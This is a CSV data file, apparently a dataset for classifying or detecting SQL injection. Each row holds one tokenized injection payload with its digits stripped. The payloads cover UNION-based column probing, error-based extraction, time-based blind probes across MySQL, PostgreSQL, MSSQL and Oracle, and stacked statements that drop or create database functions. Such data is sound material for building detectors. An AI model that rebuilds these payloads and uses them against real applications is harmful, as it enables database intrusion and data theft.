,language,source
2237,sql,". . . / / / / ? = & = & = "" ) ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ( " pgiz " = " "
2238,sql,". . / / / ? = ' ) union all select null , null , null , null , null , null , null , null , null , null # "
2239,sql,". . . ? = - % ' ) ) union all select , , , # "
2240,sql,". . . / / / ? = & = - ) union all select , , , , , , -- "
2241,sql,". . . / / ? = ' union all select null , null , null , null -- "
2242,sql,". . . . / / ? = & = & = & = ) union all select null , null , null , null , null # "
2243,sql,". . / / / ? = & = "" union all select null , null , null , null , null , null -- "
2244,sql,". . . . / / / ? = & = & = & = % ' ) rlike ( select ( case when ( = ) then else x end ) ) and ( ' % ' = ' "
2245,sql,". . / / / / ? = & = ) rlike ( select ( case when ( = ) then else x end ) ) and ( = "
2246,sql,". . . . / ? = & = ' ) ) union all select null , null -- "
2247,sql,". . . . / / / ? = & = & = & = ' ) ) ; select ( case when ( = ) then else / ( select ) end ) --"
2248,sql,". . . . ? = & = ' procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) -- "
2249,sql,". . / ? = & = & = ) ) ) rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and ( ( ( = "
2250,sql,". . . . / / / / ? = & = % ' ) ) and = and ( ( ' % ' = ' "
2251,sql,". . ? = & = "" ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( " buyi " like " "
2252,sql,". . . ? = & = & = & = - % ' ) ) order by -- "
2253,sql,". . / ? = union all select null -- "
2254,sql,". . . . / / / ? = % "" and = % "
2255,sql,". . / / ? = & = & = "" union all select null , null -- "
2256,sql,". . . . / ? = & = & = ' ) ) ; ( select * from ( select ( sleep ( ) ) ) cxfv ) # "
2257,sql,". . . . / ? = & = & = & = ' ) and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ( ' scnr ' like ' "
2258,sql,". . . / / / ? = & = & = - union all select , , , , , , # "
2259,sql,". . . / / / ? = % ' ) ) order by -- "
2260,sql,". . / / ? = & = & = & = ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
2261,sql,". . . ? = & = & = ' , ( select ( case when ( = ) then else * ( select union all select ) end ) ) -- "
2262,sql,". . . . / / ? = & = & = & = % ' ) ) union all select null , null , null , null , null # "
2263,sql,". . . . / / ? = & = & = - % ' ) order by -- "
2264,sql,". . / / / / ? = & = & = & = ) ) order by -- "
2265,sql,". . / / / / ? = & = & = ' and = -- "
2266,sql,". . / ? = ' ) ) and = and ( ( ' ejiq ' like ' "
2267,sql,". . / / / / ? = & = & = - "" union all select , , , , , -- "
2268,sql,". . . . / / / ? = & = & = % ' ) ) union all select null , null , null , null , null , null # "
2269,sql,". . . . / ? = union all select null , null , null , null # "
2270,sql,". . / / / ? = ' and make_set ( = , ) and ' czkr ' like ' "
2271,sql,". . / ? = & = ( case when ( = ) then else * ( select from dual union select from dual ) end ) "
2272,sql,". . . / / / / ? = & = & = ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) -- "
2273,sql,". . . ? = & = & = % "" and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and " % " = " "
2274,sql,". . . / / ? = & = & = & = ) and = and ( = "
2275,sql,". . . . / / ? = & = & = & = - ) order by # "
2276,sql,". . / / / ? = & = - ' ) union all select # "
2277,sql,". . . ? = & = "" ) ) rlike sleep ( ) and ( ( " tcav " = " "
2278,sql,". . ? = & = and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) -- "
2279,sql,". . . / / / / ? = & = & = & = % ' ) ; select sleep ( ) and ( ' % ' = ' "
2280,sql,". . / / ? = & = & = & = - ) order by # "
2281,sql,". . . / / ? = & = & = & = "" ) union all select null , null , null , null , null , null , null , null , null , null # "
2282,sql,". . . . / / / ? = & = ) and = and ( = "
2283,sql,". . . . ? = & = ' ) ) union all select null , null , null , null , null , null -- "
2284,sql,". . . . / / / ? = & = & = - "" ) union all select , , # "
2285,sql,". . . / / / ? = & = & = ) ; if ( = ) select else drop function gguo --"
2286,sql,". . . . / / / / ? = & = ) ) ; select pg_sleep ( ) --"
2287,sql,". . / / / / ? = - union all select # "
2288,sql,". . ? = & = & = & = ' , ( select ( case when ( = ) then else / ( select ) end ) ) -- "
2289,sql,". . . / / / ? = & = ' ) ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ( ' qhgk ' like ' "
2290,sql,". . . . / / / / ? = & = & = "" ) union all select null , null , null , null , null , null , null , null , null , null # "
2291,sql,". . / / ? = - ' union all select , , , # "
2292,sql,". . . / / / / ? = & = & = & = - "" ) union all select , , , , , , , , # "
2293,sql,". . . . ? = & = & = & = and make_set ( = , ) "
2294,sql,". . . / ? = "" union all select null , null , null , null , null # "
2295,sql,". . ? = ( select ( case when ( = ) then xaffdedeafffe else * ( select from information_schema . plugins ) end ) ) "
2296,sql,". . / ? = & = & = & = % ' and elt ( = , sleep ( ) ) and ' % ' = ' "
2297,sql,". . / / / / ? = & = & = - "" ) union all select , , , -- "
2298,sql,". . / / ? = & = & = ' ; select ( case when ( = ) then else / ( select ) end ) --"
2299,sql,". . / / ? = & = % ' order by -- "
2300,sql,". . . . / / / / ? = & = & = waitfor delay ' : : ' # "
2301,sql,". . . . / / / ? = ' union all select null , null , null , null , null , null , null , null , null , null -- "
2302,sql,". . . / ? = & = ) ; if ( = ) select else drop function rpwm --"
2303,sql,". . . ? = & = & = & = - ' ) union all select , , , , # "
2304,sql,". . / / / ? = & = & = ' ) and = # "
2305,sql,". . . / / ? = & = & = & = ' union all select null , null , null , null , null , null , null , null , null # "
2306,sql,". . . . / ? = % ' ) ; if ( = ) select else drop function tqqk --"
2307,sql,". . . / / / ? = & = & = & = "" ) and = % "
2308,sql,". . ? = & = - ' ) union all select , , , , , , # "
2309,sql,". . . / / ? = & = & = & = % ' and make_set ( = , ) and ' % ' = ' "
2310,sql,". . / / ? = & = & = ' union all select null , null , null , null , null -- "
2311,sql,". . / / ? = & = & = & = "" ) ) ; select ( case when ( = ) then else / ( select ) end ) --"
2312,sql,". . / / ? = & = & = union all select null , null , null , null , null , null , null -- "
2313,sql,". . / / ? = & = & = - ' ) ) union all select , , , , , , , -- "
2314,sql,". . / / / ? = & = & = - ' order by -- "
2315,sql,". . . ? = & = "" and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and " ogbi " like " "
2316,sql,". . . . / / ? = "" ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
2317,sql,". . / / / ? = & = & = & = ' ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ' dbjn ' = ' "
2318,sql,". . . . ? = & = % ' and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ' % ' = ' "
2319,sql,". . . . / / ? = and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) -- "
2320,sql,". . . . / / / ? = & = "" ) ; if ( = ) select else drop function rpwm --"
2321,sql,". . . ? = & = and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) # "
2322,sql,". . . ? = & = & = % ' and make_set ( = , ) and ' % ' = ' "
2323,sql,". . ? = ' ) ) union all select null , null , null , null , null , null , null , null # "
2324,sql,". . . . / ? = "" ) and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ( " ykqr " = " "
2325,sql,". . / / / ? = & = & = "" and = -- "
2326,sql,". . / / ? = - ' ) ) union all select , , , , -- "
2327,sql,". . . / / / ? = & = & = - ' ) union all select , , , , -- "
2328,sql,". . . . / / / ? = & = & = ' ) ) and make_set ( = , ) and ( ( ' zpwy ' like ' "
2329,sql,". . . . ? = & = - "" union all select , , , , , # "
2330,sql,". . / / / ? = & = & = & = ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( = "
2331,sql,". . . . / / ? = & = & = & = - "" union all select , , , , , -- "
2332,sql,". . ? = & = & = % ' and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ' % ' = ' "
2333,sql,". . . / / / / ? = & = & = ' ) ) ) union all select null # "
2334,sql,". . ? = & = & = ' ) ) ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ( ( ' zpip ' = ' "
2335,sql,". . . / / / ? = & = ] ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and ( = "
2336,sql,". . / / / ? = ' ) ) order by -- "
2337,sql,". . . . / / / ? = & = ' ) ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and ( ( ' ydfc ' = ' "
2338,sql,". . / / ? = "" and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and " eizt " like " "
2339,sql,". . . / / ? = & = ) ) ) union all select null , null , null , null , null # "
2340,sql,". . . . / ? = "" ) union all select null , null , null , null , null , null -- "
2341,sql,". . . / / / / ? = & = - ' union all select , , # "
2342,sql,". . ? = & = & = % "" and make_set ( = , ) and " % " = " "
2343,sql,". . / ? = % ' ) ) ; waitfor delay ' : : ' --"
2344,sql,". . . . ? = & = & = ) waitfor delay ' : : ' and ( = "
2345,sql,". . . . / / / ? = & = & = ' and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) -- "
2346,sql,". . . . / / / / ? = % ' and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) and ' % ' = ' "
2347,sql,". . . . / / ? = & = & = ' and elt ( = , sleep ( ) ) -- "
2348,sql,". . / / / / ? = & = ) ) union all select null , null , null , null , null , null , null , null , null , null # "
2349,sql,". . ? = & = "" ) union all select null , null , null , null , null , null , null # "
2350,sql,". . . . / ? = - ' ) ) union all select , , , , , , , # "
2351,sql,". . . / / ? = & = ' and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ' zfxm ' = ' "
2352,sql,". . . ? = % ' ) and sleep ( ) and ( ' % ' = ' "
2353,sql,". . . / ? = - ' ) ) ) union all select , , , , , , # "
2354,sql,". . / ? = & = ' ) union all select null , null , null , null , null , null , null , null , null , null -- "
2355,sql,". . . . / / / / ? = & = "" and = % "
2356,sql,". . . / / ? = & = & = & = "" and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and " hdwo " like " "
2357,sql,". . . / / / ? = & = & = & = ' ) and = # "
2358,sql,". . . . / / / ? = & = ' ) ) ) and = and ( ( ( ' ygpk ' = ' "
2359,sql,". . / / / ? = & = & = ' ) and make_set ( = , ) and ( ' fdun ' = ' "
2360,sql,". . / ? = & = & = % ' ) ) and make_set ( = , ) and ( ( ' % ' = ' "
2361,sql,". . . . / / / / ? = & = & = % ' ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ' % ' = ' "
2362,sql,". . / ? = & = & = & = ) and = -- "
2363,sql,". . . / ? = & = & = & = % "" ; select ( case when ( = ) then else / ( select ) end ) --"
2364,sql,". . . / / ? = & = & = ' ) ) ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ( ( ' waly ' = ' "
2365,sql,". . / / / / ? = & = and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) "
2366,sql,". . / / ? = & = union all select null , null , null -- "
2367,sql,". . / / / ? = & = ' ) ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( ( ' wryi ' like ' "
2368,sql,". . ? = and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) # "
2369,sql,". . . . / / / ? = & = & = - % ' ) ) union all select -- "
2370,sql,". . . . / / / / ? = & = & = & = % ' ) ) and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ( ( ' % ' = ' "
2371,sql,". . / / ? = & = & = & = ) ) ) union all select null , null , null # "
2372,sql,". . . . ? = & = ' rlike sleep ( ) -- "
2373,sql,". . / ? = & = & = & = ' and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) and ' bedw ' like ' "
2374,sql,". . . . / / / / ? = - order by -- "
2375,sql,". . . / ? = & = - % ' ) union all select , , , , # "
2376,sql,". . / / / / ? = & = & = & = % ' ) ) union all select null , null -- "
2377,sql,". . / / ? = % ' ) and = # "
2378,sql,". . . / / / / ? = & = "" union all select null # "
2379,sql,". . . / / / ? = & = & = & = ) union all select null , null , null , null , null , null , null -- "
2380,sql,". . . . / ? = & = ' ) ) and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ( ( ' mzaz ' = ' "
2381,sql,". . . . / / / ? = & = ) ) and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ( ( = "
2382,sql,". . . . / / / ? = & = % "" rlike ( select * from ( select ( sleep ( ) ) ) ufpp ) and " % " = " "
2383,sql,". . . / ? = - % ' ) ) union all select , , , , , , , , # "
2384,sql,". . . ? = ' ) ) ; select sleep ( ) and ( ( ' ibij ' like ' "
2385,sql,". . . . / ? = & = union all select null -- "
2386,sql,". . . . / ? = ' ) ) ) ; select pg_sleep ( ) --"
2387,sql,". . . . / ? = & = & = % ' union all select null , null , null , null , null , null , null , null , null # "
2388,sql,". . . / / / / ? = & = % ' and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ' % ' = ' "
2389,sql,". . . / / ? = % "" union all select null , null , null , null , null , null , null , null , null , null # "
2390,sql,". . . / ? = % ' ) and = -- "
2391,sql,". . ? = & = & = & = % ' ) ) union all select null , null , null , null , null # "
2392,sql,". . / / ? = & = ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) "
2393,sql,". . / / ? = - ) ) ) union all select # "
2394,sql,". . . / / / / ? = & = & = & = ' ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ' wgym ' = ' "
2395,sql,". . . / ? = & = & = rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) -- "
2396,sql,". . . / / ? = & = & = & = ' union all select null # "
2397,sql,". . . / / / ? = % ' and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ' % ' = ' "
2398,sql,". . . . / / / / ? = & = & = & = - union all select # "
2399,sql,". . / / / ? = & = - ) union all select , , , # "
2400,sql,". . . . / / / / ? = & = & = & = ) ) ) ; select pg_sleep ( ) --"
2401,sql,". . . . ? = "" ) union all select null , null , null , null , null # "
2402,sql,". . ? = & = % ' union all select null , null , null , null , null , null , null , null # "
2403,sql,". . . / / ? = & = & = union all select null , null , null , null , null , null , null , null , null # "
2404,sql,". . / / ? = & = & = ) ) ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and ( ( ( = "
2405,sql,". . / / ? = & = & = % ' and = and ' % ' = ' "
2406,sql,". . . / / ? = & = - "" ) union all select , , , , , , # "
2407,sql,". . . . / / / / ? = & = ) ) ) and = ( select from pg_sleep ( ) ) and ( ( ( = "
2408,sql,". . ? = & = & = - "" union all select , , , , # "
2409,sql,". . / / / ? = & = & = & = - ' ) ) union all select , , , , , , , , -- "
2410,sql,". . / / / ? = & = & = "" ) and make_set ( = , ) and ( " oniu " like " "
2411,sql,". . . . / / / / ? = & = & = & = - "" ) union all select , , , , , , , # "
2412,sql,". . / / ? = & = % "" and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and " % " = " "
2413,sql,". . / ? = & = & = , ( begin if ( = ) then dbms_lock . sleep ( ) ; else dbms_lock . sleep ( ) ; end if ; end ; ) "
2414,sql,". . . . / ? = & = & = & = % ' ) and = % "
2415,sql,". . . ? = & = & = & = - ' ) union all select , , , , , , , , , -- "
2416,sql,". . . / ? = & = & = & = % "" union all select null , null -- "
2417,sql,". . . / ? = & = & = & = ' ) ) ) ; select sleep ( ) # "
2418,sql,". . / / ? = ' ) ; select sleep ( ) and ( ' fxql ' like ' "
2419,sql,". . / / ? = % "" ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
